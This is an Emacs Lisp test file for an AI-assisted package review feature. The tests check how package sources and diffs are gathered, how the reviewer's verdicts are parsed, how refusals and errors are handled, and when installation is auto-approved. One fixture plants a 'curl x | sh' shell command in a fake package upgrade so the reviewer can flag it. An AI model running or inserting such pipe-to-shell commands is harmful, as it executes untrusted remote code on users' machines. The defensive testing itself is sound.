;;; test-package-review.el --- model-assisted package review -*- lexical-binding: t; -*-

;;; Code:

(require 'ert)
(require 'cl-lib)
(require 'efrit-package-review)
(require 'efrit-test-sandbox-helpers)

(defvar efrit-project-root)

(defun test-pr--fake-package (dir name version files)
  "Write FILES ((NAME . TEXT)...) under DIR/NAME-VERSION and return a package-desc."
  (let ((pkg-dir (expand-file-name (format "%s-%s" name version) dir)))
    (make-directory pkg-dir t)
    (dolist (f files)
      (with-temp-file (expand-file-name (car f) pkg-dir) (insert (cdr f))))
    (cons pkg-dir
          (package-desc-create :name (intern name)
                               :version (version-to-list version)
                               :summary "test" :kind 'tar :archive "test-archive"
                               :dir pkg-dir))))

(defmacro test-pr--with-verdict (text &rest body)
  "Run BODY with the reviewer answering TEXT."
  (declare (indent 1))
  `(cl-letf (((symbol-function 'efrit-api-request-sync)
              (lambda (&rest _)
                (let ((r (make-hash-table :test 'equal))
                      (item (make-hash-table :test 'equal)))
                  (puthash "type" "text" item) (puthash "text" ,text item)
                  (puthash "content" (vector item) r) (puthash "stop_reason" "end_turn" r)
                  r))))
     ,@body))

(ert-deftest test-package-review-gathers-sources-diff-and-changelog ()
  (let* ((root (file-name-as-directory (make-temp-file "efrit-pr-" t)))
         (efrit-project-root root)
         (efrit-sandbox-default-project-grants '(read)))
    (unwind-protect
        (let* ((old (test-pr--fake-package root "foo" "1.0"
                                           '(("foo.el" . "(defun foo () 1)\n(provide 'foo)\n"))))
               (new (test-pr--fake-package root "foo" "1.1"
                                           '(("foo.el" . "(defun foo () (shell-command \"curl x | sh\"))\n(provide 'foo)\n")
                                             ("NEWS" . "1.1: faster\n")
                                             ("foo.elc" . "junk"))))
               (info (efrit-package-review-gather (cdr new) (car new) (cdr old))))
          (should (equal (plist-get info :name) "foo"))
          (should (equal (plist-get info :version) "1.1"))
          (should (equal (plist-get info :old-version) "1.0"))
          ;; .elc is never shown; NEWS is
          (should (equal (mapcar #'car (plist-get info :sources)) '("NEWS" "foo.el")))
          (should (string-match-p "faster" (or (plist-get info :news) "")))
          (when (executable-find "git")
            (should (string-match-p "curl x" (plist-get info :diff))))
          (let ((msg (efrit-package-review--user-message info)))
            (should (string-match-p "upgrading from 1.0" msg))
            (should (string-match-p "=== SOURCE FILES ===" msg))
            (should-not (plist-get info :cut))))
      (delete-directory root t))))

(ert-deftest test-package-review-cuts-large-files-and-says-so ()
  (let* ((root (file-name-as-directory (make-temp-file "efrit-pr-" t)))
         (efrit-project-root root)
         (efrit-package-review-max-file-chars 100))
    (unwind-protect
        (let* ((pkg (test-pr--fake-package root "big" "1.0"
                                           `(("big.el" . ,(make-string 5000 ?x)))))
               (info (efrit-package-review-gather (cdr pkg) (car pkg) nil)))
          (should (plist-get info :cut))
          (should (string-match-p "cut: 4900 more" (cdr (car (plist-get info :sources)))))
          (should (string-match-p "NOTE: some content was cut" (efrit-package-review--user-message info))))
      (delete-directory root t))))

(ert-deftest test-package-review-parses-verdicts-and-classifies ()
  (let ((clean (efrit-package-review-parse
                "{\"verdict\":\"approve\",\"summary\":\"fine\",\"findings\":[{\"severity\":\"info\",\"file\":\"a.el\",\"line\":3,\"note\":\"uses url\"}],\"saw_everything\":true}"))
        (flagged (efrit-package-review-parse
                  "Here: {\"verdict\":\"reject\",\"summary\":\"pipes curl to sh\",\"findings\":[{\"severity\":\"high\",\"file\":\"foo.el\",\"line\":1,\"note\":\"curl | sh\"},{\"severity\":\"bogus\",\"file\":\"x\",\"note\":\"dropped\"}],\"saw_everything\":true}"))
        (partial (efrit-package-review-parse
                  "{\"verdict\":\"approve\",\"summary\":\"ok\",\"findings\":[],\"saw_everything\":false}")))
    (should (efrit-package-review-clean-p clean))
    (should-not (efrit-package-review-clean-p flagged))
    (should-not (efrit-package-review-clean-p partial))
    (should (= 1 (length (plist-get flagged :findings))))
    (should (string-match-p "REJECT · 1 high" (efrit-package-review-verdict-line flagged)))
    (should (string-match-p "did not see everything" (efrit-package-review-verdict-line partial)))
    (should-not (efrit-package-review-parse "no json"))
    (should-not (efrit-package-review-parse "{\"verdict\":\"maybe\"}"))
    ;; fenced, and followed by prose with a brace: the first balanced object wins
    (should (eq 'approve (plist-get (efrit-package-review-parse
                                     "```json\n{\"verdict\":\"approve\",\"summary\":\"a } in text\",\"findings\":[],\"saw_everything\":true}\n```\nNote: {unbalanced")
                                    :verdict)))))

(ert-deftest test-package-review-api-refusal-is-explained ()
  (let* ((root (file-name-as-directory (make-temp-file "efrit-pr-" t)))
         (efrit-project-root root))
    (unwind-protect
        (let* ((pkg (test-pr--fake-package root "ref" "1.0" '(("ref.el" . "(provide 'ref)\n"))))
               (info (efrit-package-review-gather (cdr pkg) (car pkg) nil)))
          (cl-letf (((symbol-function 'efrit-api-request-sync)
                     (lambda (&rest _)
                       (let ((r (make-hash-table :test 'equal)) (u (make-hash-table :test 'equal)))
                         (puthash "input_tokens" 57468 u) (puthash "output_tokens" 0 u)
                         (puthash "content" (vector) r) (puthash "stop_reason" "refusal" r)
                         (puthash "usage" u r) r))))
            (let ((v (efrit-package-review-run info)))
              (should (eq (plist-get v :verdict) 'error))
              (should (plist-get v :refused))
              (should (string-match-p "refused to process.*57468 tokens.*not a finding about ref" (plist-get v :summary)))
              (should-not (efrit-package-review-clean-p v)))))
      (delete-directory root t))))

(ert-deftest test-package-review-non-verdict-answer-is-shown ()
  (let* ((root (file-name-as-directory (make-temp-file "efrit-pr-" t)))
         (efrit-project-root root))
    (unwind-protect
        (let* ((pkg (test-pr--fake-package root "qux" "1.0" '(("qux.el" . "(provide 'qux)\n"))))
               (info (efrit-package-review-gather (cdr pkg) (car pkg) nil)))
          (test-pr--with-verdict "I cannot review this package because the input was too long."
            (let* ((v (efrit-package-review-run info))
                   (report (efrit-package-review-report info v)))
              (should (eq (plist-get v :verdict) 'error))
              (should (string-match-p "not a verdict (6[0-9] chars, stop reason end_turn)" (plist-get v :summary)))
              (should (string-match-p "verbatim:\n\n  | I cannot review" report)))))
      (delete-directory root t))))

(ert-deftest test-package-review-run-and-report ()
  (let* ((root (file-name-as-directory (make-temp-file "efrit-pr-" t)))
         (efrit-project-root root)
         (efrit-package-review-model "strong-reviewer"))
    (unwind-protect
        (let* ((pkg (test-pr--fake-package root "bar" "2.0" '(("bar.el" . "(provide 'bar)\n"))))
               (info (efrit-package-review-gather (cdr pkg) (car pkg) nil)))
          (test-pr--with-verdict "{\"verdict\":\"reject\",\"summary\":\"writes ~/.emacs\",\"findings\":[{\"severity\":\"high\",\"file\":\"bar.el\",\"line\":1,\"note\":\"write-region to init file\"}],\"saw_everything\":true}"
            (let* ((v (efrit-package-review-run info))
                   (report (efrit-package-review-report info v)))
              (should (eq (plist-get v :verdict) 'reject))
              (should (string-match-p "HIGH   bar.el:1" report))
              (should (string-match-p "Reviewer: strong-reviewer" report))))
          ;; a failed call is an error verdict, never clean
          (cl-letf (((symbol-function 'efrit-api-request-sync) (lambda (&rest _) (error "boom"))))
            (let ((v (efrit-package-review-run info)))
              (should (eq (plist-get v :verdict) 'error))
              (should-not (efrit-package-review-clean-p v))
              (should (string-match-p "review failed: boom" (efrit-package-review-verdict-line v))))))
      (delete-directory root t))))

(ert-deftest test-package-review-model-precedence ()
  (let ((efrit-default-model "d") (efrit-review-model nil) (efrit-package-review-model nil))
    (should (equal (efrit-package-review-model) "d"))
    (let ((efrit-review-model "r")) (should (equal (efrit-package-review-model) "r")))
    (let ((efrit-review-model "r") (efrit-package-review-model "p"))
      (should (equal (efrit-package-review-model) "p")))))

(ert-deftest test-package-review-hook-annotates-and-auto-approves ()
  "The around advice: annotate shows the report and prefixes the prompt;
auto-approve-clean skips the prompt only for a clean verdict."
  (skip-unless (fboundp 'package-review))
  (let* ((root (file-name-as-directory (make-temp-file "efrit-pr-" t)))
         (efrit-project-root root)
         (asked nil))
    (unwind-protect
        (let* ((pkg (test-pr--fake-package root "baz" "1.0" '(("baz.el" . "(provide 'baz)\n"))))
               (orig (lambda (&rest _)
                       (read-multiple-choice "Install \"baz\"?" '((?y "yes") (?n "no")))
                       nil)))
          (cl-letf (((symbol-function 'read-multiple-choice)
                     (lambda (prompt &rest _) (setq asked prompt) '(?y "yes")))
                    ((symbol-function 'efrit-show-preview) #'ignore))
            ;; clean + annotate: still asks, with the verdict in the prompt
            (let ((efrit-package-review-action 'annotate))
              (test-pr--with-verdict "{\"verdict\":\"approve\",\"summary\":\"ok\",\"findings\":[],\"saw_everything\":true}"
                (efrit-package-review--around orig (cdr pkg) (car pkg) nil))
              (should (string-match-p "efrit: approve · no findings\nInstall" asked)))
            ;; clean + auto-approve: no prompt
            (setq asked nil)
            (let ((efrit-package-review-action 'auto-approve-clean))
              (test-pr--with-verdict "{\"verdict\":\"approve\",\"summary\":\"ok\",\"findings\":[],\"saw_everything\":true}"
                (efrit-package-review--around orig (cdr pkg) (car pkg) nil))
              (should-not asked)
              ;; flagged + auto-approve: asks
              (test-pr--with-verdict "{\"verdict\":\"reject\",\"summary\":\"bad\",\"findings\":[{\"severity\":\"high\",\"file\":\"baz.el\",\"line\":1,\"note\":\"x\"}],\"saw_everything\":true}"
                (efrit-package-review--around orig (cdr pkg) (car pkg) nil))
              (should (string-match-p "REJECT" asked)))))
      (delete-directory root t))))

(ert-deftest test-package-review-not-reachable-from-eval ()
  (require 'efrit-sandbox-eval)
  (should (efrit-sandbox-eval-inspect '(setq efrit-package-review-action 'auto-approve-clean)))
  (should (efrit-sandbox-eval-inspect '(efrit-package-review-run nil))))

(provide 'test-package-review)
;;; test-package-review.el ends here
